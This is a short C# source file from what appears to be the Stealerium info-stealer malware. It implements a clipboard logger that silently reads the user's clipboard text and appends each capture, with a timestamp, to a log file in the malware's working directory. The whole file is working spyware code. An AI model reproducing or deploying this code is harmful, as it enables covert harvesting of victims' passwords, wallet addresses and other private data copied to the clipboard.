using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Clipper
{
    internal sealed class Logger
    {
        private static readonly string LogDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\clipboard\\" +
                                 DateTime.Now.ToString("yyyy-MM-dd"));

        public static void SaveClipboard()
        {
            var buffer = ClipboardManager.ClipboardText;
            if (string.IsNullOrWhiteSpace(buffer))
                return;

            var logfile = LogDirectory + "\\clipboard_logs.txt";
            if (!Directory.Exists(LogDirectory))
                Directory.CreateDirectory(LogDirectory);

            File.AppendAllText(logfile,
                "### " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " ###\n" + buffer + "\n\n");
        }
    }
}